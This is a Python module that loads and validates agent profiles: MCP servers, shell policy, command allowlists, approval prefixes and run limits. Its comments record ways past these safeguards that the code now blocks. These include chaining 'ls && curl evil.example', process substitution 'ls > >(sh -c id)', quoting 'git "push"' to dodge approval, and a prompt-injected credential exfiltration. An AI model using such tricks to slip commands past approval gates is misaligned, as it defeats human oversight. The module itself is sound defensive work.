"""Profiles: what this agent is configured to be, as data rather than code.

A profile names the MCP servers to open, whether a shell is available and under
what policy, which commands need a human to approve them, and the ceilings on a
single run. It is the answer to "make this usable in any industry without
editing Python": a finance team, a lab and a game studio write three JSON
documents and share no code at all. A longer default system prompt cannot do
that job, because the thing that differs between them is which tools exist and
what is dangerous, not how to phrase a request.

Deliberately free of Streamlit and LangChain imports, like `config.py`, so the
rules can be tested without a script run or a model. This module decides what a
profile *means*; `agent.py` decides what to build from it.
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Literal

#: Where a shell command may run. `docker` is the only default: the container
#: has no network, so the indirect-prompt-injection path that got the shipped
#: shell server removed in 0.2.0 — read a poisoned web page, exfiltrate a
#: credential — has nowhere to send anything. `host` runs the model's commands
#: as the Streamlit process itself and is never a default.
ShellPolicyName = Literal["docker", "host"]

SHELL_POLICIES: tuple[ShellPolicyName, ...] = ("docker", "host")

#: Below `DEFAULT_TOOL_TIMEOUT`, for the same reason that sits below the turn
#: budget: the inner bound has to expire first or it buys nothing.
DEFAULT_COMMAND_TIMEOUT = 30.0


class ProfileError(Exception):
    """Raised when a profile cannot be read, parsed or validated."""


@dataclass(frozen=True)
class ShellSettings:
    """Whether this profile can run commands, and under what constraints."""

    enabled: bool = False
    policy: ShellPolicyName = "docker"
    workspace_root: str | None = None
    #: Commands this profile may run at all. Empty means none: an allowlist that
    #: defaults to "everything" is not an allowlist. Matched on the first word.
    allow: tuple[str, ...] = ()
    #: Command prefixes that need a person to say yes, matched against the whole
    #: command line, so `git push` can require approval while `git status` does
    #: not. Per-prefix rather than per-tool because "may this agent use a
    #: shell" is not a question anyone can answer usefully once.
    approve: tuple[str, ...] = ()
    command_timeout: float = DEFAULT_COMMAND_TIMEOUT


@dataclass(frozen=True)
class Limits:
    """Ceilings on one run. A runaway agent is a cost and a safety problem."""

    tool_calls_per_run: int | None = None
    model_calls_per_run: int | None = None


@dataclass(frozen=True)
class Profile:
    """One configured way of working."""

    name: str
    description: str = ""
    #: Appended to the base system prompt rather than replacing it: the base
    #: prompt carries the rules about tool use that every profile needs.
    system_prompt: str = ""
    #: Which servers from `config.json` to open. None means all of them, which
    #: is what reproduces the behaviour of every version before this one.
    mcp_servers: tuple[str, ...] | None = None
    shell: ShellSettings = field(default_factory=ShellSettings)
    limits: Limits = field(default_factory=Limits)
    #: Give the model a `write_todos` tool and the prompt that makes it plan
    #: before acting. Off by default and not on a whim: it adds a tool
    #: definition and roughly a page of system prompt to every request, which
    #: is a real cost on a profile whose work is two commands long.
    todos: bool = False
    #: Drop old tool output once the conversation passes this many tokens.
    #: None leaves every result in place. Worth setting for a profile whose
    #: tools return a lot — a directory listing read forty turns ago is paid
    #: for on every turn after it.
    clear_tool_output_at: int | None = None


#: What you get with no profiles file at all: every configured MCP server, no
#: shell, no ceilings. Identical to 0.4.1's behaviour, so adding this module
#: changes nothing until someone writes a profile.
DEFAULT_PROFILE = Profile(
    name="general",
    description="Every configured MCP server, no shell.",
)


def profiles_path() -> Path:
    """Where profiles live. Beside `config.json` on the same mounted volume."""
    return Path(os.environ.get("MCP_PROFILES_PATH", "profiles.json"))


def _as_tuple(value: Any, *, field_name: str, profile: str) -> tuple[str, ...]:
    if not isinstance(value, list) or not all(isinstance(item, str) for item in value):
        raise ProfileError(f"Profile '{profile}' field '{field_name}' must be a list of strings.")
    return tuple(value)


def _validate_shell(raw: Any, *, profile: str) -> ShellSettings:
    if not isinstance(raw, dict):
        raise ProfileError(f"Profile '{profile}' field 'shell' must be an object.")

    policy = raw.get("policy", "docker")
    if policy not in SHELL_POLICIES:
        raise ProfileError(
            f"Profile '{profile}' shell policy {policy!r} is not one of "
            f"{', '.join(SHELL_POLICIES)}."
        )

    enabled = raw.get("enabled", False)
    if not isinstance(enabled, bool):
        raise ProfileError(f"Profile '{profile}' field 'shell.enabled' must be true or false.")

    allow = _as_tuple(raw.get("allow", []), field_name="shell.allow", profile=profile)
    approve = _as_tuple(raw.get("approve", []), field_name="shell.approve", profile=profile)

    if enabled and not allow:
        # Silence here would read as "no restrictions" and mean "no commands".
        # Either reading is a surprise, so refuse rather than pick one.
        raise ProfileError(
            f"Profile '{profile}' enables the shell with an empty 'allow' list, so no "
            "command could ever run. List the commands it may use, or set "
            "'enabled': false."
        )

    timeout = raw.get("command_timeout", DEFAULT_COMMAND_TIMEOUT)
    if not isinstance(timeout, int | float) or isinstance(timeout, bool) or timeout <= 0:
        raise ProfileError(
            f"Profile '{profile}' field 'shell.command_timeout' must be a positive number."
        )

    workspace_root = raw.get("workspace_root")
    if workspace_root is not None and not isinstance(workspace_root, str):
        raise ProfileError(f"Profile '{profile}' field 'shell.workspace_root' must be a string.")

    return ShellSettings(
        enabled=enabled,
        policy=policy,
        workspace_root=workspace_root,
        allow=allow,
        approve=approve,
        command_timeout=float(timeout),
    )


def _validate_limits(raw: Any, *, profile: str) -> Limits:
    if not isinstance(raw, dict):
        raise ProfileError(f"Profile '{profile}' field 'limits' must be an object.")

    values: dict[str, int | None] = {}
    for key in ("tool_calls_per_run", "model_calls_per_run"):
        value = raw.get(key)
        if value is None:
            values[key] = None
            continue
        if not isinstance(value, int) or isinstance(value, bool) or value < 1:
            raise ProfileError(f"Profile '{profile}' field 'limits.{key}' must be a positive int.")
        values[key] = value

    return Limits(**values)


def validate_profile(name: str, raw: Any) -> Profile:
    """Check one profile entry and return it typed.

    Raises:
        ProfileError: with a message suitable for showing to the user.
    """
    if not isinstance(raw, dict):
        raise ProfileError(f"Profile '{name}' must be a JSON object.")

    description = raw.get("description", "")
    system_prompt = raw.get("system_prompt", "")
    for field_name, value in (("description", description), ("system_prompt", system_prompt)):
        if not isinstance(value, str):
            raise ProfileError(f"Profile '{name}' field '{field_name}' must be a string.")

    servers = raw.get("mcp_servers")
    mcp_servers = (
        None if servers is None else _as_tuple(servers, field_name="mcp_servers", profile=name)
    )

    todos = raw.get("todos", False)
    if not isinstance(todos, bool):
        raise ProfileError(f"Profile '{name}' field 'todos' must be true or false.")

    clear_at = raw.get("clear_tool_output_at")
    if clear_at is not None and (
        not isinstance(clear_at, int) or isinstance(clear_at, bool) or clear_at < 1
    ):
        raise ProfileError(
            f"Profile '{name}' field 'clear_tool_output_at' must be a positive int of tokens."
        )

    return Profile(
        name=name,
        description=description,
        system_prompt=system_prompt,
        mcp_servers=mcp_servers,
        shell=_validate_shell(raw.get("shell", {}), profile=name),
        limits=_validate_limits(raw.get("limits", {}), profile=name),
        todos=todos,
        clear_tool_output_at=clear_at,
    )


def load_profiles() -> dict[str, Profile]:
    """Read and validate every profile.

    A missing file yields the default profile alone, which is what makes this
    module invisible until someone opts in. A file that exists but is broken
    raises, for the same reason `load_config` does: silently falling back would
    run the agent under settings nobody chose.
    """
    path = profiles_path()
    if not path.exists():
        return {DEFAULT_PROFILE.name: DEFAULT_PROFILE}

    try:
        raw = path.read_text(encoding="utf-8")
    except OSError as exc:
        raise ProfileError(f"Could not read {path}: {exc}") from exc

    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise ProfileError(f"{path} is not valid JSON: {exc}") from exc

    if not isinstance(parsed, dict):
        raise ProfileError(f"{path} must contain a JSON object of profiles.")
    if not parsed:
        raise ProfileError(f"{path} contains no profiles. Delete it to use the default.")

    return {name: validate_profile(name, entry) for name, entry in parsed.items()}


def servers_for(profile: Profile, config: dict[str, Any]) -> dict[str, Any]:
    """The subset of `config.json` this profile opens.

    Raises:
        ProfileError: if the profile names a server the configuration does not
            have. Skipping it silently would cost the user a tool with no
            indication of why the agent cannot do what they asked.
    """
    if profile.mcp_servers is None:
        return dict(config)

    missing = [name for name in profile.mcp_servers if name not in config]
    if missing:
        raise ProfileError(
            f"Profile '{profile.name}' names {', '.join(repr(m) for m in missing)}, which "
            f"{'is' if len(missing) == 1 else 'are'} not in the MCP configuration. "
            f"Available: {', '.join(sorted(config)) or 'none'}."
        )

    return {name: config[name] for name in profile.mcp_servers}


#: Where one command ends and the next begins. The shell tool's own description
#: tells the model to chain with `&&` and `;`, so a rule that reads only the
#: start of the line is not a rule at all: `ls && curl evil.example` passed an
#: allowlist of `ls` until this existed. Measured against the shipped middleware
#: description, not guessed.
_SEPARATORS = re.compile(r"&&|\|\||[;|&\n]")

#: Constructs that run a command whose text is not in the line being checked.
#: `$(...)`, backticks and both directions of process substitution smuggle one
#: past any amount of parsing, so they are refused outright rather than
#: analysed. `>(` was missing from the first cut of this and is the reason an
#: allowlist of nothing but `ls` still permitted `ls > >(sh -c id)`.
_SUBSTITUTION = re.compile(r"\$\(|`|<\(|>\(")


def command_segments(command: str) -> list[str]:
    """Every command in one shell line, split on the operators that join them.

    Deliberately crude. It does not understand quoting, so a separator inside a
    quoted string splits a segment that the shell would not — which fails
    closed, by checking more than it has to rather than less. The sandbox, not
    this function, is what makes a mistake here survivable.
    """
    return [segment.strip() for segment in _SEPARATORS.split(command) if segment.strip()]


def _significant_words(segment: str) -> list[str]:
    """The words of one command, with quote characters removed.

    Quoting is one of the two ways an approval rule gets walked around:
    `git "push"` and `git p"ush"` both run a push, and both slipped past a rule
    of `git push` that compared raw words — verified by running them. Position
    is the other way, and that one is handled by matching in order rather than
    by adjacency; dropping option tokens here as well was tried and removed,
    because an in-order match already steps over them and the extra rule
    covered nothing a test could tell apart.
    """
    words: list[str] = []
    for raw in segment.split():
        word = raw.replace('"', "").replace("'", "")
        if word:
            words.append(word)
    return words


def needs_approval(command: str, settings: ShellSettings) -> bool:
    """Whether any command on this line matches one of the approval prefixes.

    Any, not the first: `ls && git push` has to stop for a person just as
    `git push` does. Prefix rather than equality, so the rule `git push` covers
    `git push --force origin main`; matched on whole words, so it does not also
    cover `git pushover`.

    The rule's words must appear **in order** but need not be adjacent, and
    options are dropped first. Prefix matching was not enough: `git -c x push`,
    `git -C /tmp push` and `git "push"` all ran a push and all slipped past a
    rule of `git push`, verified by running them. An option's separated value
    (`-C` then `/tmp`) is an ordinary word to any splitter, so the only way to
    stop position hiding a subcommand is to stop requiring adjacency.

    This over-matches rather than under-matches — `git log push-notes` would
    stop for a person under a `git push` rule. That is the safe direction, and
    the alternative is a rule that reads as protection while not being any.
    """
    for segment in command_segments(command):
        words = _significant_words(segment)
        for rule in settings.approve:
            if _in_order(_significant_words(rule), words):
                return True
    return False


def _in_order(needle: list[str], words: list[str]) -> bool:
    """Whether every word of `needle` appears in `words`, in order."""
    if not needle:
        return False
    remaining = iter(words)
    return all(word in remaining for word in needle)


def is_allowed(command: str, settings: ShellSettings) -> bool:
    """Whether the profile permits every command on this line.

    Every segment's first word must be listed: an allowlist of executables,
    like `MCP_ALLOWED_COMMANDS` for MCP servers. What arguments follow is the
    model's business, which is what the approval rules and the sandbox are for.

    This is defence in depth and not the boundary. A shell allowlist that is
    also a parser is a losing position — the boundary is the execution policy,
    which by default is a container with no network and a read-only root.
    """
    if _SUBSTITUTION.search(command):
        return False

    segments = command_segments(command)
    if not segments:
        return False
    return all(
        (words := _significant_words(segment)) and words[0] in settings.allow
        for segment in segments
    )
